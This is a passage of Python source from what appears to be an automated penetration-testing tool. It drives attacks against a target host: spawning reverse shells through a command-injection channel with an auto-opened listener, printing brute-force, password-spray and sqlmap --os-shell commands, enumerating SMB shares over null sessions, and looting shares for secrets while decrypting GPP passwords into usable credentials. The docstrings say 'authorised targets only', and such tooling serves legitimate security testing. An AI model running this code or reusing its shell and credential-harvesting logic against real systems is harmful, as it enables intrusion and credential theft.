            m = re.search(re.escape(dm) + r"(.*?)" + re.escape(dm), body, re.S)
            return m.group(1) if m else None

        if (run("id") or "").find("uid=") >= 0:
            def fire(cmd, _h=host, _p=path, _pa=param, _w=wrap):
                threading.Thread(target=lambda: _get(_h, _p, _pa, _w(cmd + " &")),
                                 daemon=True).start()
            return run, fire, f"cmdi {host}{path}?{param} ({label})"
    return None


def _enumerate_shells(run) -> set:
    """Which interpreters exist on the target, probed live through the command channel."""
    cmd = ("for b in " + " ".join(_FOOTHOLD_ENUM_TOOLS) +
           "; do command -v $b >/dev/null 2>&1 && echo HAVE:$b; done")
    return set(re.findall(r"HAVE:(\S+)", run(cmd) or ""))


def _open_listener_terminal(script_path: str) -> "str | None":
    """Open the smart listener in a new terminal window/tab. Returns the emulator used, or None
    when headless (no display / no emulator) so the caller can fall back to inline instructions."""
    term = next(((shutil.which(x), flag) for x, flag in _TERM_EMULATORS if shutil.which(x)),
                (None, None))
    if not (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")) or not term[0]:
        return None
    binary, flag = term
    q = shlex.quote(script_path)
    inner = f"python3 {q}; rm -f {q}; exec ${{SHELL:-/bin/bash}}"
    try:
        subprocess.Popen([binary] + flag + ["sh", "-c", inner],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL, start_new_session=True)
        return binary
    except Exception:                                         # noqa: BLE001
        return None


def _tool_foothold(ip: str, port: int, proto: str) -> str:
    """HTTP step-26 tool (INTERACTIVE): spawn and auto-upgrade a reverse shell over a confirmed
    RCE channel. Rebuilds an echo-based cmdi vector from the DB, enumerates which interpreters
    live on the target, lets the operator pick a viable payload, opens a smart auto-upgrading
    listener in a new terminal, and fires the payload so the target connects back. Authorised
    targets only. Requires a cmdi vector (run cmdi-scan first) — otherwise prints manual payloads."""
    import time
    import tempfile

    lhost = _foothold_lhost(ip)
    channel = _foothold_channel(ip, port, proto)

    if not channel:
        print(f"\n{YELLOW}no confirmed command channel{RESET} — run {BOLD}cmdi-scan (r 19){RESET} "
              f"first, or paste a payload into a shell you already have.")
        lh = lhost or "<YOUR_IP>"
        print(f"{DIM}reverse shells (start {BOLD}nc -lvnp 4444{RESET}{DIM} on {lh}):{RESET}")
        for label, _need, tpl, _pty in _REVSHELLS[:4]:
            print(f"  {CYAN}{label:14}{RESET} {tpl.replace('{ip}', lh).replace('{port}', '4444')}")
        return "foothold: no command channel (cmdi-scan first) — manual payloads shown"

    run, fire, desc = channel
    ctx_id = (run("id") or "").strip()
    print(f"\n{GREEN}✓ command channel:{RESET} {desc}")
    if ctx_id:
        print(f"  {DIM}context:{RESET} {ctx_id}")
    if not lhost:
        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
        return "foothold: no route to determine LHOST"

    avail = _enumerate_shells(run)
    print(f"  {DIM}on target:{RESET} {', '.join(sorted(avail)) or DIM + 'enumeration empty' + RESET}")
    viable = [rs for rs in _REVSHELLS if not avail or rs[1] in avail] or _REVSHELLS

    print(f"\n{BOLD}spawnable reverse shells{RESET} {DIM}(LHOST {lhost}){RESET}")
    for i, (label, need, _tpl, pty) in enumerate(viable, 1):
        tag = f"{GREEN}pty{RESET}" if pty else f"{DIM}dumb→auto-upgrade{RESET}"
        print(f"  {CYAN}{i:>2}{RESET} {label:14} {DIM}({need}){RESET}  {tag}")
    try:
        raw = input(f"{BOLD}pick a shell #{RESET} (or 'q'): ").strip()
    except (EOFError, KeyboardInterrupt):
        return "foothold: aborted"
    if not raw or raw.lower() == "q":
        return "foothold: aborted (no shell chosen)"
    if not raw.isdigit() or not 1 <= int(raw) <= len(viable):
        return "foothold: invalid choice"
    label, _need, tpl, pty = viable[int(raw) - 1]
    try:
        pin = input(f"{BOLD}LPORT{RESET} [4444]: ").strip()
    except (EOFError, KeyboardInterrupt):
        return "foothold: aborted"
    want = int(pin) if pin.isdigit() and 1 <= int(pin) <= 65535 else 4444
    lport = _free_local_port(want)
    if lport != want:
        print(f"  {YELLOW}port {want} is in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} instead{RESET}")

    payload = tpl.replace("{ip}", lhost).replace("{port}", str(lport))
    upgrade = b"" if pty else _FOOTHOLD_UPGRADE.encode()
    src = (_SMART_LISTENER_SRC.replace("__LPORT__", str(lport))
           .replace("__UPGRADE__", repr(upgrade)))
    fd, spath = tempfile.mkstemp(prefix="pshunter_listener_", suffix=".py")
    with os.fdopen(fd, "w") as fh:
        fh.write(src)

    used = _open_listener_terminal(spath)
    if not used:
        _safe_unlink(spath)
        print(f"\n{YELLOW}headless — no terminal to open.{RESET} Run this listener yourself:")
        print(f"  {BOLD}nc -lvnp {lport}{RESET}   {DIM}(on {lhost}){RESET}")
        print(f"then this fires the shell. payload:\n  {DIM}{payload}{RESET}")
        return f"foothold: headless — listener not opened; payload for {label} shown"

    print(f"\n{GREEN}▶ listener opened in a new terminal{RESET} {DIM}({used}) on {lhost}:{lport}{RESET}")
    print(f"  {DIM}firing {label} through {desc}…{RESET}")
    time.sleep(1.5)                                           # let the listener bind first
    fire(payload)
    print(f"  {DIM}→ check the new terminal for your{RESET} "
          f"{GREEN}{'pty' if pty else 'auto-upgraded'} shell{RESET}"
          f"{DIM}; if nothing lands, egress may be firewalled.{RESET}")
    return (f"foothold: fired {label} reverse shell → {lhost}:{lport} "
            f"(via {desc}); listener in a new terminal")


# ── HTTP step 27: manual next steps — a context-aware "when stuck" playbook (list only) ──
def _tool_next_steps(ip: str, port: int, proto: str) -> str:
    """HTTP step-27 tool: NOT a scan — a read-only checklist of manual escalations for when the
    automated steps came up short, with this host's own findings substituted in (HTTP-phase
    CVEs, discovered vhosts/params/users → ready commands, and unconfirmed ⚠ hits listed for
    manual verification). Pure DB synthesis; no network traffic."""
    services = fetch_services(ip)
    svc = services.get((port, proto)) or (None, None, None, None)
    name = svc[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    base = f"{scheme}://{ip}:{port}/"
    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip) if hn and hn != ip})

    scripts = fetch_scripts(ip, port, proto)
    by_sid = {}
    for sid, out in scripts:
        by_sid.setdefault(sid, out or "")

    cms = (re.search(r"^CMS: (\S+)", by_sid.get("cms-scan", ""), re.M) or [None, None])[1] \
        if "CMS:" in by_sid.get("cms-scan", "") else None
    mu = re.search(r"⚠ CMS-USERS (.+)", by_sid.get("cms-scan", ""))
    users = [u.strip() for u in mu.group(1).split(",")] if mu else []

    params = re.findall(r"^\s*(/\S*)\?\[([^\]]+)\]", by_sid.get("param-hunt", ""), re.M)
    eps = list(dict.fromkeys(re.findall(r"^\s*\+ \d{3}\s+(\S+)", by_sid.get("dir-brute", ""), re.M)))[:8]

    warns = []
    for sid, out in scripts:
        for ln in (out or "").splitlines():
            s = ln.strip()
            if s.startswith("⚠") and "CMS-USERS" not in s:
                warns.append(f"{DIM}[{sid}]{RESET} {s}")
    warns = warns[:14]

    # CVEs actually surfaced in the HTTP phase: this port's findings + any CVE-id in its output
    kev = _load_kev()
    found_cves = set()
    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
        if p == port and pr == proto and cv:
            found_cves |= {c.strip() for c in cv.split(",") if c.strip()}
    for _sid, out in scripts:
        found_cves |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
    found_cves = sorted(found_cves, key=_cve_sort_key)

    L = [f"{base} — manual steps {DIM}(reference only — nothing is scanned here){RESET}",
         f"{DIM}targets: {base}" + (f"  ·  vhosts: {', '.join(vhosts)}" if vhosts else "") + RESET]

    L.append(f"{DIM}▶ shell? → Privilege Escalation phase, step 1 (spawn-shell) — one place, all services{RESET}")
    L.append(f"\n{BOLD}A. Deeper enumeration (bigger lists / longer / recursive){RESET}")
    L.append(f"  {DIM}feroxbuster -u {base} -w /usr/share/seclists/Discovery/Web-Content/"
             f"directory-list-2.3-big.txt -x php,txt,bak,zip -r{RESET}")
    L.append(f"  {DIM}ffuf -u {base}FUZZ -w /usr/share/seclists/Discovery/Web-Content/"
             f"raft-large-words.txt -e .php,.bak,.old{RESET}")
    if vhosts or True:
        L.append(f"  {DIM}vhost: ffuf -u {base} -H 'Host: FUZZ.<domain>' -w "
                 f"/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs <baseline>{RESET}")
    L.append(f"  {DIM}subdomains (if you know the domain): subfinder -d <domain> ; amass enum -d <domain>{RESET}")
    L.append(f"  {DIM}params: arjun -u {base}<endpoint> -w big.txt  ·  x8  ·  Burp Param Miner{RESET}")
    L.append(f"  {DIM}api: check /openapi.json /swagger  ·  GraphQL introspection on /graphql{RESET}")

    L.append(f"\n{BOLD}B. Interactive & heavier tooling{RESET}")
    L.append(f"  {DIM}Burp: proxy + spider + active scan; Intruder/Turbo Intruder on the params below; "
             f"Collaborator for blind OOB (XXE/SSRF/SSTI){RESET}")
    tag = cms.lower() if cms else "<tech>"
    L.append(f"  {DIM}nuclei -u {base} -tags {tag},cve,exposure  ·  nuclei -u {base} -as (auto tech){RESET}")
    L.append(f"  {DIM}wafw00f {base}  (if requests get blocked → --delay / proxychains / rotate IP){RESET}")

    L.append(f"\n{BOLD}C. CVEs surfaced in the HTTP phase{RESET}")
    if found_cves:
        for c in found_cves:
            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
    else:
        L.append(f"  {DIM}none surfaced yet — re-run searchsploit (r4) / cms-scan (r12) "
                 f"if versions were found{RESET}")

    L.append(f"\n{BOLD}D. Credentials & authentication{RESET}")
    if users:
        L.append(f"  {CYAN}users found:{RESET} {', '.join(users)}")
        L.append(f"  {DIM}spray: hydra -L users.txt -p '<Season2024!>' {ip} http-post-form ...  (mind lockout){RESET}")
    L.append(f"  {DIM}full brute on the real login form: hydra -l <user> -P "
             f"/usr/share/wordlists/rockyou.txt {ip} -s {port} http[s]-post-form "
             f"'/login:user=^USER^&pass=^PASS^:F=incorrect'{RESET}")
    L.append(f"  {DIM}reuse any looted creds across the host's other services (SSH/SMB/DB/RDP){RESET}")

    L.append(f"\n{BOLD}E. Injection deep-dive{RESET}")
    if params:
        L.append(f"  {CYAN}params to target:{RESET} " +
                 "; ".join(f"{p}?[{pp}]" for p, pp in params[:6]))
    if eps:
        L.append(f"  {CYAN}endpoints:{RESET} {', '.join(eps)}")
    L.append(f"  {DIM}sqlmap -u '{base}<endpoint>?id=1' --level 5 --risk 3 --tamper=space2comment "
             f"--batch --dbs  (then --os-shell){RESET}")
    L.append(f"  {DIM}LFI wrapper chains / deeper traversal (ffuf)  ·  SSTI engine-specific gadgets{RESET}")
    L.append(f"  {DIM}deserialization if you see __VIEWSTATE / PHP-serialized / Java blobs → ysoserial{RESET}")
    L.append(f"  {DIM}HTTP request smuggling / desync (Burp){RESET}")

    L.append(f"\n{BOLD}F. Additional vulnerability classes to test manually{RESET}")
    L.append(f"  {DIM}XSS (reflected/stored/DOM) · CSRF · business logic · race conditions · "
             f"OAuth/SAML/JWT deep · CORS misconfig{RESET}")

    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
    if warns:
        for w in warns:
            L.append(f"  {w}")
    else:
        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")

    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
    if vhosts:
        L.append(f"  {DIM}add vhosts to /etc/hosts, then re-run dir-brute (r9) per vhost: "
                 f"{ip} {' '.join(vhosts)}{RESET}")
    L.append(f"  {DIM}raise time budgets and re-run the long steps (vhost r8 / dir-brute r9 / param r11){RESET}")
    L.append(f"  {DIM}enumerate the host's OTHER ports/services (own checklists) — the web app may not be the way in{RESET}")
    return "\n".join(L)


# ── SMB step 1+2: unauthenticated enumeration ─────────────────────────────────
_SMBENUM_DEADLINE = 240          # s — hard wall-clock cap across every external call
_SMB_ANSI = re.compile(r"\x1b\[[0-9;]*m")


def _smb_run(cmd: list, timeout: int) -> "tuple[int, str]":
    """Run an external SMB tool; return (rc, ANSI-stripped stdout+stderr). Never raises."""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return 124, ""
    except OSError as exc:
        return 127, str(exc)
    return p.returncode, _SMB_ANSI.sub("", (p.stdout or "") + (p.stderr or ""))


def _nxc_body(out: str) -> str:
    """Strip netexec's repeated '<PROTO>  <ip>  <port>  <HOST>  ' line prefix (SMB / WINRM /
    LDAP …) so the payload (share table / user list / cmd output) reads cleanly; drop banner
    ([*]/[+]/[-]) lines."""
    body = []
    for ln in out.splitlines():
        m = re.match(r"^[A-Z]+\s+\S+\s+\d+\s+\S+\s+(.*)$", ln)
        rest = m.group(1) if m else ln
        if rest.strip() and not rest.lstrip().startswith(("[*]", "[+]", "[-]", "[!]")):
            body.append(rest.rstrip())
    return "\n".join(body)


def _smb_parse_banner(out: str, facts: dict) -> None:
    """Pull host/OS/domain/signing/SMBv1 out of a netexec SMB banner line into ``facts``."""
    m = re.search(r"445\s+\S+\s+\[\*\]\s*(.+)", out)
    if m and "os" not in facts:
        facts["os"] = re.sub(r"\s*\(name:.*$", "", m.group(1)).strip()
    for key, rx in (("name", r"\(name:([^)]*)\)"), ("domain", r"\(domain:([^)]*)\)"),
                    ("signing", r"\(signing:(\w+)\)"), ("smbv1", r"\(SMBv1:(\w+)\)")):
        mm = re.search(rx, out)
        if mm and key not in facts:
            facts[key] = mm.group(1).strip()


def _smb_enum_nxc(nxc: str, ip: str, deadline: float) -> "list[str]":
    """netexec path: banner (null then guest), then shares/users/rid/groups/pass-pol with
    whichever anonymous session is accepted. Returns the report lines (empty if nothing)."""
    import time
    facts, report = {}, []
    session = None
    for alabel, (u, pw) in (("null session", ("", "")), ("guest", ("guest", ""))):
        _, out = _smb_run([nxc, "smb", ip, "-u", u, "-p", pw], 60)
        _smb_parse_banner(out, facts)
        if re.search(r"\b445\b.*\[\+\]", out) and session is None:
            session = (alabel, u, pw)
    if not facts and session is None:
        return []                                    # nxc ran but target isn't speaking SMB
    host = facts.get("name", "?")
    line = f"[*] Host: {host}   OS: {facts.get('os', '?')}"
    dom = facts.get("domain", "")
    if dom and dom.lower() != host.lower():
        line += f"   Domain: {dom}"
    report.append(line)
    sm = []
    if facts.get("signing") is not None:
        sm.append("signing required" if facts["signing"].lower() in ("true", "1", "yes")
                  else "signing NOT required")
    if facts.get("smbv1") is not None:
        sm.append("SMBv1 enabled" if facts["smbv1"].lower() in ("true", "1", "yes")
                  else "SMBv1 disabled")
    if sm:
        report.append("[*] SMB: " + " · ".join(sm))
    if session is None:
        report.append("[*] Access: null/guest denied — banner only "
                      "(creds needed to enumerate shares/users)")
        return report
    alabel, u, pw = session
    report.append(f"[*] Access: {alabel} allowed")
    for flag, sub, cap in (("SHARES", "--shares", 90), ("USERS", "--users", 90),
                           ("RID-BRUTE", "--rid-brute", 120), ("GROUPS", "--groups", 90),
                           ("PASSWORD POLICY", "--pass-pol", 60)):
        if time.time() > deadline:
            report.append(f"\n{flag}\n  (skipped — time budget reached)")
            break
        _, out = _smb_run([nxc, "smb", ip, "-u", u, "-p", pw, sub], cap)
        body = _nxc_body(out)
        if body.strip():
            report.append(f"\n{flag}\n{body}")
    return report


def _smb_enum_fallback(ip: str, deadline: float) -> "list[str]":
    """No-netexec path: smbclient (shares) + rpcclient (domain/users) + nmap NSE (OS/signing)."""
    report = []
    smbclient, rpcclient, nmap = (shutil.which("smbclient"), shutil.which("rpcclient"),
                                  shutil.which("nmap"))
    if nmap:
        _, out = _smb_run([nmap, "-Pn", "-p445", "--script",
                           "smb-os-discovery,smb-security-mode,smb-protocols", ip], 120)
        keep = [ln.strip() for ln in out.splitlines()
                if re.search(r"os:|computer name|domain|signing|SMBv1|2\.0|3\.0|3\.1", ln, re.I)]
        if keep:
            report.append("[*] nmap NSE\n  " + "\n  ".join(keep))
    if smbclient:
        _, out = _smb_run([smbclient, "-L", f"//{ip}/", "-N"], 40)
        sh = [ln.rstrip() for ln in out.splitlines() if re.search(r"\bDisk\b|\bIPC\b", ln)]
        if sh:
            report.append("SHARES (smbclient -N)\n" + "\n".join(sh))
    if rpcclient:
        _, out = _smb_run([rpcclient, "-U", "", "-N", ip, "-c", "querydominfo;enumdomusers"], 40)
        us = [ln.strip() for ln in out.splitlines() if "user:" in ln.lower() or "Domain:" in ln]
        if us:
            report.append("USERS / DOMAIN (rpcclient null)\n  " + "\n  ".join(us))
    return report


def _tool_smb_enum(ip: str, port: int, proto: str) -> str:
    """SMB step 1+2 tool: unauthenticated (null / guest) enumeration — shares, users
    (incl. RID cycling), groups, password policy — plus the host OS, domain, SMB dialect
    and signing status. Read-only: no share writes, no credential guessing, so there is
    no lockout risk. netexec is the engine; falls back to smbclient + rpcclient + nmap
    NSE. A missing toolchain or a target not speaking SMB raises, so the step won't turn
    green on a non-result. Authorised targets only."""
    import time
    deadline = time.time() + _SMBENUM_DEADLINE
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if nxc:
        report = _smb_enum_nxc(nxc, ip, deadline)
    elif shutil.which("smbclient") or shutil.which("rpcclient") or shutil.which("nmap"):
        report = _smb_enum_fallback(ip, deadline)
    else:
        raise RuntimeError("no SMB tooling found — install netexec (or smbclient/rpcclient/nmap)")
    if not report:
        raise RuntimeError(f"{ip}:{port} did not answer SMB enumeration (unreachable / not SMB?)")
    return f"SMB enumeration — {ip}:{port}/{proto}\n\n" + "\n".join(report)


# ── SMB step 2: version-RCE vulnerability scan (DETECTION ONLY) ────────────────
_SMBVULN_DEADLINE = 300          # s — hard wall-clock cap across every external call
# (nmap script, canonical (label, CVE)) — CVE strings kept in the report so the generic
# CVE harvester + KEV tagging pick them up automatically.
_SMBVULN_NMAP = {
    "smb-vuln-ms17-010":            ("MS17-010 EternalBlue", "CVE-2017-0143"),
    "smb-vuln-ms08-067":            ("MS08-067", "CVE-2008-4250"),
    "smb-double-pulsar-backdoor":   ("DoublePulsar implant (host already compromised)", None),
}


def _smbvuln_nmap(nmap: str, ip: str) -> "tuple[dict, bool]":
    """Run the safe nmap smb-vuln detection scripts; return ({script: vulnerable_bool}, reachable)."""
    scripts = ",".join(_SMBVULN_NMAP)
    _, out = _smb_run([nmap, "-Pn", "-p139,445", "--script", scripts, ip], 240)
    sections, cur = {}, None
    for ln in out.splitlines():
        # nmap prefixes the last result of a block with '|_' (underscore is a word char, so a
        # leading \b won't match) — anchor the '|'/'|_' prefix instead.
        hm = re.match(r"\|_?\s*(smb-vuln-ms17-010|smb-vuln-ms08-067|smb-double-pulsar-backdoor)\s*:", ln)
        if hm:
            cur = hm.group(1)
            sections.setdefault(cur, []).append(ln)
        elif ln.startswith("|") and cur:
            sections[cur].append(ln)
        elif not ln.startswith("|"):
            cur = None
    result = {}
    for key in _SMBVULN_NMAP:
        text = " ".join(sections.get(key, []))
        result[key] = ("VULNERABLE" in text) and ("NOT VULNERABLE" not in text)
    reachable = bool(sections) or ("445/tcp open" in out) or ("139/tcp open" in out)
    return result, reachable


def _smbvuln_nxc(nxc: str, ip: str) -> "tuple[dict, bool]":
    """netexec modules: ms17-010 (confirm) + smbghost. Returns ({mod: vulnerable_bool}, reachable)."""
    res, reachable = {}, False
    for mod in ("ms17-010", "smbghost"):
        _, out = _smb_run([nxc, "smb", ip, "-M", mod], 90)
        if re.search(r"\b445\b", out):
            reachable = True
        res[mod] = bool(re.search(r"vulnerable", out, re.I)) and \
            not re.search(r"not vulnerable|appears not|is not vulnerable", out, re.I)
    return res, reachable


def _tool_smb_vuln(ip: str, port: int, proto: str) -> str:
    """SMB step 2 tool: DETECTION-ONLY scan for unauth version-RCE SMB bugs — MS17-010
    (EternalBlue), MS08-067, SMBGhost (CVE-2020-0796) and the DoublePulsar implant. Never
    exploits, never passes nmap unsafe=1, never fires a payload. nmap NSE is the engine
    (MS17-010 / MS08-067 / DoublePulsar) with netexec adding SMBGhost + an MS17-010 confirm.
    A confirmed hit is a CRITICAL RCE finding (CVE auto-harvested + KEV-tagged). An
    unreachable / non-SMB target raises; an all-clean SMB host returns a clean report.
    Authorised targets only."""
    nmap = shutil.which("nmap")
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nmap and not nxc:
        raise RuntimeError("no SMB vuln tooling found — install nmap and/or netexec")
    nmap_res, nxc_res, reachable = {}, {}, False
    if nmap:
        nmap_res, r1 = _smbvuln_nmap(nmap, ip)
        reachable = reachable or r1
    if nxc:
        nxc_res, r2 = _smbvuln_nxc(nxc, ip)
        reachable = reachable or r2
    if not reachable:
        raise RuntimeError(f"{ip}:{port} did not answer the SMB vuln scan (unreachable / not SMB?)")

    # canonical checks: (label, cve, vulnerable | None=not tested)
    ms17 = None
    if "smb-vuln-ms17-010" in nmap_res or "ms17-010" in nxc_res:
        ms17 = bool(nmap_res.get("smb-vuln-ms17-010")) or bool(nxc_res.get("ms17-010"))
    checks = [
        ("MS17-010 EternalBlue", "CVE-2017-0143", ms17),
        ("MS08-067", "CVE-2008-4250",
         nmap_res.get("smb-vuln-ms08-067") if "smb-vuln-ms08-067" in nmap_res else None),
        ("SMBGhost", "CVE-2020-0796",
         nxc_res.get("smbghost") if "smbghost" in nxc_res else None),
        ("DoublePulsar implant (host already compromised)", None,
         nmap_res.get("smb-double-pulsar-backdoor")
         if "smb-double-pulsar-backdoor" in nmap_res else None),
    ]
    lines = []
    for label, cveid, vuln in checks:
        if vuln:                                  # CVE string ONLY on confirmed hits, so the
            lines.append(f"✗ VULN {label}" + (f" ({cveid})" if cveid else ""))   # generic CVE
        elif vuln is None:                        # harvester never tags a non-vulnerable check
            lines.append(f"· {label}: not tested (tool unavailable)")
        else:
            lines.append(f"· {label}: not vulnerable")
    return (f"SMB vuln scan — {ip}:{port}/{proto}  (detection only)\n\n" + "\n".join(lines))


# ── SMB step 3: share looting (read-only, in-memory grep) ─────────────────────
_SMBLOOT_DEADLINE = 360          # s — hard wall-clock cap
_SMBLOOT_MAX_FILE = 5_000_000    # per-file download ceiling (bytes)
_SMBLOOT_MAX_FILES = 120         # how many interesting files to fetch+grep
_SMBLOOT_MAX_TOTAL = 100_000_000  # total bytes fetched
# filenames / extensions worth reading — configs, secrets, keys, backups, scripts
_SMB_LOOT_RE = re.compile(
    r"(?i)(groups\.xml|unattend\.xml|sysprep\.(?:inf|xml)|web\.config|autologin|"
    r"\.(?:config|xml|ps1|psd1|bat|cmd|vbs|ini|conf|cnf|env|ya?ml|json|sql|bak|old|kdbx|"
    r"ppk|pem|key|ovpn|rdp|txt|log|csv|ldb|pfx|p12|reg)$|id_[rd]sa|\.git-credentials|"
    r"\.npmrc|passwo?rd|secret|cred|backup|\.kdbx)")


def _smb_gpp_decrypt(cpw: str) -> "str | None":
    """Decrypt a GPP cpassword blob with gpp-decrypt (the AES key is public MS knowledge)."""
    exe = shutil.which("gpp-decrypt")
    if not exe:
        return None
    _, out = _smb_run([exe, cpw], 15)
    for ln in reversed((out or "").splitlines()):
        if ln.strip():
            return ln.strip()
    return None


def _smb_session_flag(smbclient: str, ip: str) -> "tuple[list, list] | None":
    """Return ([smbclient auth args], [Disk share names]) for the first anonymous session
    (null then guest) that can list shares; None if neither is accepted."""
    for auth in (["-N"], ["-U", "guest%"]):
        _, out = _smb_run([smbclient, "-L", f"//{ip}/"] + auth, 40)
        shares = re.findall(r"^\s+(\S+)\s+Disk\b", out, re.M)
        if shares:
            return auth, [s for s in shares if s.upper() != "IPC$"]
    return None


def _smb_recurse_ls(smbclient: str, ip: str, share: str, auth: list) -> "list | None":
    """(path, size) files under a share via 'recurse ON; ls'; None if access is denied."""
    _, out = _smb_run([smbclient, f"//{ip}/{share}"] + auth + ["-c", "recurse ON; ls"], 90)
    if "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
        return None
    files, curdir = [], ""
    for ln in out.splitlines():
        if ln.startswith("\\"):
            curdir = ln.strip().strip("\\")
            continue
        m = re.match(r"\s+(.+?)\s+([DAHSRN]+)\s+(\d+)\s+\w{3}\s+\w{3}\s", ln)
        if m:
            name, attrs, size = m.group(1).strip(), m.group(2), int(m.group(3))
            if "D" in attrs or name in (".", ".."):
                continue
            path = (curdir + "\\" + name) if curdir else name
            files.append((path, size))
    return files


def _smb_fetch(smbclient: str, ip: str, share: str, path: str, auth: list, tmpdir: str) -> "bytes | None":
    """Download one file to a transient temp path, read it into memory, then delete it —
    nothing loot is persisted to disk. Returns the bytes, or None on failure."""
    import tempfile
    fd, tmp = tempfile.mkstemp(dir=tmpdir)
    os.close(fd)
    try:
        _smb_run([smbclient, f"//{ip}/{share}"] + auth + ["-c", f'get "{path}" "{tmp}"'], 60)
        with open(tmp, "rb") as fh:
            return fh.read(_SMBLOOT_MAX_FILE + 1)
    except OSError:
        return None
    finally:
        try:
            os.unlink(tmp)
        except OSError:
            pass


def _smb_grep_secrets(text: str) -> list:
    """(label, snippet) secrets in a file's text via the shared _SECRET_PATTERNS set."""
    hits = []
    for label, pat in _SECRET_PATTERNS:
        m = re.search(pat, text)
        if m:
            hits.append((label, m.group(0)[:60]))
    return hits


def _tool_smb_loot(ip: str, port: int, proto: str) -> str:
    """SMB step 3 tool: recursively read every readable share over a null/guest session,
    grep file contents IN MEMORY (files are fetched to a temp path, read, then deleted —
    nothing loot is written to disk) for secrets (via _SECRET_PATTERNS) and GPP cpassword
    (decrypted with gpp-decrypt → usable creds). Findings, the file inventory and harvested
    creds are stored in the DB. Read-only: never writes to a share. A missing smbclient or
    a host with no listable shares raises. Authorised targets only."""
    import time
    import tempfile
    deadline = time.time() + _SMBLOOT_DEADLINE
    smbclient = shutil.which("smbclient")
    if not smbclient:
        raise RuntimeError("smbclient not found — install it to loot SMB shares")
    sess = _smb_session_flag(smbclient, ip)
    if not sess:
        raise RuntimeError(f"{ip}:{port} — could not list shares over null/guest (denied / not SMB?)")
    auth, shares = sess
    slabel = "null" if auth == ["-N"] else "guest"

    readable, files = [], []          # files: (share, path, size)
    for share in shares:
        if time.time() > deadline:
            break
        listing = _smb_recurse_ls(smbclient, ip, share, auth)
        if listing is None:
            continue
        readable.append(share)
        for path, size in listing:
            files.append((share, path, size))

    creds, secrets, inv = [], [], []
    fetched = total = 0
    tmpdir = tempfile.mkdtemp(prefix="pshunter_smb_")
    try:
        for share, path, size in files:
            if not _SMB_LOOT_RE.search(path):
                continue
            inv.append((share, path, size))
            if (time.time() > deadline or fetched >= _SMBLOOT_MAX_FILES
                    or total >= _SMBLOOT_MAX_TOTAL or size > _SMBLOOT_MAX_FILE or size == 0):
                continue
            data = _smb_fetch(smbclient, ip, share, path, auth, tmpdir)
            if not data:
                continue
            fetched += 1
            total += len(data)
            text = data.decode("utf-8", "ignore")
            loc = f"{share}\\{path}"
            for m in re.finditer(r'cpassword\s*=\s*"?([A-Za-z0-9+/=]{8,})"?', text):
                pw = _smb_gpp_decrypt(m.group(1))
                um = re.search(r'(?:userName|newName|accountName|runAs)\s*=\s*"([^"]+)"', text)
                user = (um.group(1) if um else "unknown")
                dom = user.split("\\")[0] if "\\" in user else ""
                user = user.split("\\")[-1]
                if pw:
                    creds.append((dom, user, pw, f"GPP cpassword @ {loc}"))
                else:
                    secrets.append(("gpp-cpassword", f"cpassword blob @ {loc} (gpp-decrypt missing)"))
            for label, snip in _smb_grep_secrets(text):
                secrets.append((label, f"{label} @ {loc}"))
    finally:
        try:
            os.rmdir(tmpdir)
        except OSError:
            pass

    if creds:                          # persist harvested creds for later exec/spray steps
        blocks = _load_manual_block(ip, port, proto, "smb-creds")
        for dom, user, pw, src in creds:
            host = dom or ip
            line = f"! {user}:{pw or '<blank>'} @ {src} [{host}]"
            blocks.setdefault(host, [])
            if line not in blocks[host]:
                blocks[host].append(line)
        _save_manual_block(ip, port, proto, "smb-creds", blocks)

    lines = [f"[*] Session: {slabel}   Readable shares: {', '.join(readable) or 'none'}"]
    for dom, user, pw, src in creds:
        who = f"{dom}\\{user}" if dom else user
        lines.append(f"✗ CRED {who}:{pw} ({src})")
    for _label, desc in dict.fromkeys((s[0], s[1]) for s in secrets):
        lines.append(f"✗ SECRET {desc}")
    for share, path, size in inv[:60]:
        lines.append(f"· FILE {share}\\{path} ({size} b)")
    if len(inv) > 60:
        lines.append(f"· … +{len(inv) - 60} more interesting files")
    lines.append(f"\n[*] {len(files)} files listed · {len(inv)} interesting · {fetched} grepped "
                 f"· {len(creds)} cred(s) · {len({s[1] for s in secrets})} secret(s)")
    return f"SMB share loot — {ip}:{port}/{proto}  (read-only, in-memory grep)\n\n" + "\n".join(lines)


# ── SMB step 4: SYSVOL / NETLOGON GPP loot (authenticated, DC-targeted) ────────
_SMBGPP_DEADLINE = 300           # s — hard wall-clock cap
# SYSVOL/NETLOGON files worth reading — all GPP XML types, autologin, logon scripts, unattend
_SMB_GPP_RE = re.compile(
    r"(?i)(?:groups|services|scheduledtasks|datasources|printers|drives|registry)\.xml$|"
    r"unattend\.xml$|sysprep\.(?:inf|xml)$|\.(?:bat|cmd|ps1|psm1|vbs|kix)$")


def _looks_ip(s: str) -> bool:
    try:
        ipaddress.ip_address(s)
        return True
    except ValueError:
        return False


def _gather_smb_creds(ip: str, port: str, proto: str) -> list:
    """(domain, user, pass) creds harvested earlier — GPP loot (smb-creds) and any manual
    creds (manual-creds) recorded for this host. Feeds authenticated SMB steps."""
    out, seen = [], set()
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("smb-creds", "manual-creds"):
            for m in re.finditer(r"! (\S+?):(\S*) @ .+?\[([^\]]+)\]", output or ""):
                dom = m.group(3)
                if dom == ip or _looks_ip(dom):
